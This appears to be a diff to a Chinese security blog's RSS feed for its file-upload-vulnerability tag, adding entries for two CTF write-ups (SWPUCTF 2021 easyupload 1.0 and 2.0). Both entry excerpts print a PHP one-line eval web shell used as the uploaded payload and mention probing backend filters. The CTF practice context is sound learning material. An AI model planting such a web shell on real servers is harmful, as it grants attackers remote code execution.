@@ -3,7 +3,21 @@
         <title>文件上传漏洞 - 标签 - 梧桐漓染的博客</title>
         <link>/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</link>
         <description>文件上传漏洞 - 标签 - 梧桐漓染的博客</description>
-        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Tue, 08 Aug 2023 00:00:00 &#43;0000</lastBuildDate><atom:link href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="self" type="application/rss+xml" /><item>
+        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Thu, 26 Oct 2023 19:10:00 &#43;0800</lastBuildDate><atom:link href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="self" type="application/rss+xml" /><item>
+    <title>[SWPUCTF 2021 新生赛]easyupload2.0</title>
+    <link>/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload2.0/</link>
+    <pubDate>Thu, 26 Oct 2023 19:10:00 &#43;0800</pubDate><author>
+        <name>Lyrio</name>
+    </author><guid>/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload2.0/</guid>
+    <description><![CDATA[[SWPUCTF 2021 新生赛]easyupload2.0 上传木马： 1 &lt;?php @eval($_POST[&#39;Lyrio&#39;]);phpinfo();?&gt; // phpinfo() 在这里充当标记的作用 提示过滤了 php 文件 过滤代码在后端，只能黑盒测试 最后发现使用 php 的等]]></description>
+</item><item>
+    <title>[SWPUCTF 2021 新生赛]easyupload1.0</title>
+    <link>/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload1.0/</link>
+    <pubDate>Thu, 26 Oct 2023 16:29:00 &#43;0800</pubDate><author>
+        <name>Lyrio</name>
+    </author><guid>/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload1.0/</guid>
+    <description><![CDATA[[SWPUCTF 2021 新生赛]easyupload1.0 丢个木马上去 1 &lt;?php @eval($_POST[&#39;Lyrio&#39;]);phpinfo();?&gt; // phpinfo() 在这里充当标记的作用 看样子是被过滤了，查看页面源码，过滤代码不在前端而在后端 后端]]></description>
+</item><item>
     <title>Upload-labs靶场实战</title>
     <link>/upload-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/</link>
     <pubDate>Tue, 08 Aug 2023 00:00:00 &#43;0000</pubDate><author>
